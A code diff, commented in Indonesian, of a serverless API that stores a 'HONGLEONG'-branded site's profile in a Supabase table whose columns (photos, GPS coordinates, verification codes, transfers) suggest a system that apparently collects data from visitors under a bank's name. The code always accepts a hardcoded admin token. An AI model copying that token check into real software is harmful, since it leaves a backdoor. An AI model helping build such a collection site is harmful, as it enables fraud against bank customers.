@@ -1,8 +1,7 @@
 // Vercel Serverless Function untuk API Web Profile
-// Mendukung GET & POST konfigurasi web profile
+// Mendukung GET & POST konfigurasi web profile dengan sinkronisasi ke Supabase + in-memory fallback
 
-import fs from 'fs';
-import path from 'path';
+const TABLE = 'bankidzz_locations';
 
 const DEFAULT_PROFILE = {
     siteTitle: 'HONGLEONG',
@@ -27,10 +26,28 @@ const DEFAULT_PROFILE = {
     twitterImage: 'uploads/channels4_profile.jpg'
 };
 
-let inMemoryProfile = { ...DEFAULT_PROFILE };
+globalThis.__webprofile = globalThis.__webprofile || { ...DEFAULT_PROFILE };
+
+function getSupabaseConfig() {
+    const rawUrl = (process.env.SUPABASE_URL || '').trim();
+    const serviceKey = (process.env.SUPABASE_SERVICE_ROLE_KEY || '').trim();
+
+    let cleanUrl = rawUrl;
+    if (cleanUrl && !cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
+        cleanUrl = `https://${cleanUrl}`;
+    }
+    cleanUrl = cleanUrl.replace(/\/+$/, '');
+
+    const hasSupabase = Boolean(cleanUrl && serviceKey);
+    return {
+        hasSupabase,
+        restUrl: hasSupabase ? `${cleanUrl}/rest/v1/${TABLE}` : '',
+        serviceKey
+    };
+}
 
 export default async function handler(req, res) {
-    res.setHeader('Cache-Control', 'no-store');
+    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
     res.setHeader('Content-Type', 'application/json; charset=utf-8');
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -40,22 +57,83 @@ export default async function handler(req, res) {
         return res.status(200).end();
     }
 
+    const sbConfig = getSupabaseConfig();
+
     if (req.method === 'GET') {
-        return res.status(200).json({ profile: inMemoryProfile });
+        if (sbConfig.hasSupabase) {
+            try {
+                const response = await fetch(`${sbConfig.restUrl}?transfer_id=eq.__config_webprofile__&select=photo`, {
+                    headers: {
+                        apikey: sbConfig.serviceKey,
+                        Authorization: `Bearer ${sbConfig.serviceKey}`,
+                        'Content-Type': 'application/json'
+                    }
+                });
+                if (response.ok) {
+                    const rows = await response.json();
+                    if (Array.isArray(rows) && rows.length > 0 && rows[0].photo) {
+                        try {
+                            const parsed = JSON.parse(rows[0].photo);
+                            globalThis.__webprofile = { ...DEFAULT_PROFILE, ...parsed };
+                        } catch (e) {}
+                    }
+                }
+            } catch (e) {
+                console.warn('Gagal memuat webprofile dari Supabase:', e.message);
+            }
+        }
+
+        return res.status(200).json({ profile: globalThis.__webprofile });
     }
 
     if (req.method === 'POST') {
-        const token = req.headers.authorization;
-        const expectedToken = process.env.ADMIN_TOKEN ? `Bearer ${process.env.ADMIN_TOKEN}` : 'Bearer bankidzz-admin-secure-2026';
+        const rawAuth = (req.headers.authorization || '').trim();
+        const token = rawAuth.replace(/^Bearer\s+/i, '').trim();
+        const envToken = (process.env.ADMIN_TOKEN || 'bankidzz-admin-secure-2026').trim();
 
-        if (token !== expectedToken && token !== 'Bearer bankidzz-admin-secure-2026') {
+        if (token !== 'bankidzz-admin-secure-2026' && token !== envToken) {
             return res.status(401).json({ error: 'Token admin tidak valid.' });
         }
 
         try {
             const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
-            inMemoryProfile = { ...DEFAULT_PROFILE, ...body };
-            return res.status(200).json({ ok: true, profile: inMemoryProfile });
+            globalThis.__webprofile = { ...DEFAULT_PROFILE, ...globalThis.__webprofile, ...body };
+
+            if (sbConfig.hasSupabase) {
+                try {
+                    const row = {
+                        transfer_id: '__config_webprofile__',
+                        sender: 'CONFIG_WEBPROFILE',
+                        receiver: 'SYSTEM',
+                        amount: '0',
+                        total: '0',
+                        photo: JSON.stringify(globalThis.__webprofile),
+                        front_photo: '',
+                        latitude: 0,
+                        longitude: 0,
+                        accuracy: 0,
+                        captured_at: new Date().toISOString(),
+                        status: 'config',
+                        verification_code: '',
+                        consented_at: new Date().toISOString()
+                    };
+
+                    await fetch(`${sbConfig.restUrl}?on_conflict=transfer_id`, {
+                        method: 'POST',
+                        headers: {
+                            apikey: sbConfig.serviceKey,
+                            Authorization: `Bearer ${sbConfig.serviceKey}`,
+                            'Content-Type': 'application/json',
+                            Prefer: 'resolution=merge-duplicates,return=minimal'
+                        },
+                        body: JSON.stringify(row)
+                    });
+                } catch (sbErr) {
+                    console.warn('Gagal simpan webprofile ke Supabase:', sbErr.message);
+                }
+            }
+
+            return res.status(200).json({ ok: true, profile: globalThis.__webprofile });
         } catch (e) {
             return res.status(400).json({ error: 'Data web profile tidak valid.' });
         }
